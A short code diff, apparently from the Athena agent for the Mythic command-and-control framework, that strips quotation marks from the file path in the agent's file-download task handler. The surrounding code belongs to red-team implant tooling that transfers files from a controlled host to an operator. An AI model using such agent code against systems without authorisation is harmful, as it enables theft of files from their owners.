@@ -30,8 +30,10 @@ namespace Athena.Commands
                         {
                             MythicDownloadJob downloadJob = new MythicDownloadJob(job);
                             Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                            downloadJob.path = par["file"];
+                            
+                            downloadJob.path = par["file"].Replace("\"", "");
                             downloadJob.total_chunks = downloadJob.GetTotalChunks();
+                            
                             Globals.downloadJobs.Add(job.task.id, downloadJob);
 
                             if (downloadJob.total_chunks == 0)
